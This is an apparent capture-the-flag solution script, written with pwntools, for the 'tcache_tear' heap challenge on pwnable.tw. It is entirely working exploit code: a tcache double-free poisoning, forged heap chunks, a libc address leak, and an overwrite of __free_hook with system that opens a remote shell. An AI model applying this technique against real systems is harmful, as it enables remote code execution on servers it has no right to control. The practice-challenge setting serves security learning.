from pwn import *

####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './tcache_tear_patched'
LIBC = ELF('./libc.so.6')  # Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN)  # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)  # Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)  # Find ROP gadgets

elif REMOTETTCP:
    P = remote('chall.pwnable.tw', 10207)  # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)  # Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)  # Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid,'b *free')


#####################
#### Find Gadgets ###
#####################


# MAIN_PLT = ELF_LOADED.symbols['main']
# POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0]  # Same as ROPgadget --binary vuln | grep 'pop rdi'
# RET = (ROP_LOADED.find_gadget(['ret']))[0]
#
# log.info('Main start: ' + hex(MAIN_PLT))
# log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
# log.info('ret gadget: ' + hex(RET))


#########################
#### Finf LIBC offset ###
#########################


##########################
##### FUNCTION ######
##########################

def malloc(size, data):
    P.sendlineafter(b'choice :', b'1')
    P.sendlineafter(b'Size:', str(size).encode())
    P.sendlineafter(b'Data:', data)


def free():
    P.sendlineafter(b'choice :', b'2')


def info():
    P.sendlineafter(b'choice :', b'3')
    P.recvuntil(b'Name :')
    info = P.recvline().strip(b'$')
    return info


def write(binSize, address, value):
    malloc(binSize, b'abcd')
    free()
    free()
    malloc(binSize, p64(address))
    malloc(binSize, p64(address))
    malloc(binSize, value)


##############################
##### FINAL EXPLOITATION #####
##############################

P.sendlineafter(b'Name:', b'')

write(0x60, 0x00602550,
      p64(0) +  # prev_size
      p64(0x21) +  # size , P-bit on
      p64(0) * 3 +  # data
      p64(0x21)  # next_size
      )

write(0x70, 0x00602050,
      p64(0) + # prev_size, 0x48
      p64(0x501) + # size , P-bit on, 0x50
      p64(0) + #fw pointer 0x58
      p64(0) + #bw pointer 0x60 -> name buff
      p64(0) * 3 +
      p64(0x00602060) #to be free (pointer + 0x10 )
      )

free()
leak = u64(info()[:8])
print(hex(leak))
LIBC.address = leak - 0x3ebca0

write(0x50, LIBC.sym['__free_hook'], p64(LIBC.sym['system']))

malloc(0x80,b'/bin/sh')
free()

P.interactive()
